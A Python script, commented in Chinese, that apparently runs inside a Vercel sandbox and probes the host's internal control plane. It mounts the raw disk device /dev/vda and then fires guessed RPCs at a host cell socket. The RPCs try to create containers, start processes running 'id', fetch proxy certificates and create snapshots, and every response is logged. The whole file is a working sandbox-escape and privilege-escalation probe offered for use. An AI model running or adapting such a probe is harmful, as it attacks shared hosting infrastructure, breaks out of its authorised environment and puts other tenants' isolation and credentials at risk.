# -*- coding: utf-8 -*-
"""vda8_container_create: ContainersService/Create 深测 + HostService 探测 + drive 列表获取
1) ContainersService/Create: image 变体 (alpine/busybox 本地镜像?) + drive_id 变体
2) CelldService/GetDriveStorageUsage / StartContainer / WaitContainer
3) HostService: GetProxyCertificates / GetResourceUsage / GetOCIImageConfig / CreateSnapshot
4) ProcessService/Start: 参数猜测
输出落盘 + 哨兵 V8U_DONE"""
import os, time, socket, ctypes, subprocess, re

OUT = '/vercel/sandbox/v8u.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'

    # P1: ContainersService/Create image 变体
    log('=== P1 Create image 变体 ===')
    bodies = [
        '{"image":"alpine"}',
        '{"image":"alpine:latest"}',
        '{"image":"busybox"}',
        '{"image":"docker.io/library/alpine:latest"}',
        '{"image":"public.ecr.aws/docker/library/alpine:latest"}',
        '{"image":"/vercel/sandbox"}',
        '{"drive_id":"%s"}' % ('d' * 32),
        '{"image":"alpine","command":["id"],"env":{}}',
    ]
    for body in bodies:
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Create', body, t=6)
        log('create %-70s -> %s | %s' % (body, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.5)

    # P2: CelldService 探测
    log('=== P2 CelldService ===')
    for m, body in [('GetDriveStorageUsage', '{}'),
                    ('GetDriveStorageUsage', '{"drive_id":"%s"}' % ('d' * 32)),
                    ('StartContainer', '{}'),
                    ('WaitContainer', '{}'),
                    ('Configure', '{}'),
                    ('SetWorkload', '{}')]:
        st, bd = rpc_unix(sp, '/vercel.hive.celld.api.v1.CelldService/%s' % m, body, t=4)
        log('celld %s %-40s -> %s | %s' % (m, body, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.4)

    # P3: HostService 探测
    log('=== P3 HostService ===')
    for m, body in [('GetProxyCertificates', '{}'),
                    ('GetResourceUsage', '{}'),
                    ('GetOCIImageConfig', '{}'),
                    ('SetOCIImageConfig', '{}'),
                    ('WaitForDrive', '{}'),
                    ('CreateSnapshot', '{}')]:
        st, bd = rpc_unix(sp, '/vercel.hive.host.api.v1.HostService/%s' % m, body, t=4)
        log('host %s -> %s | %s' % (m, st, bd[:300].replace('\n', ' ')))
        time.sleep(0.4)

    # P4: ProcessService/Start
    log('=== P4 ProcessService/Start ===')
    for body in ['{"command":["id"]}',
                 '{"command":"id"}',
                 '{"argv":["id"]}',
                 '{"cmd":["id"],"env":{}}',
                 '{"process_id":"%s"}' % ('e' * 32)]:
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.processes.v1.ProcessService/Start', body, t=4)
        log('proc %-50s -> %s | %s' % (body, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.4)

    log('V8U_DONE')
    f.close()


if __name__ == '__main__':
    main()
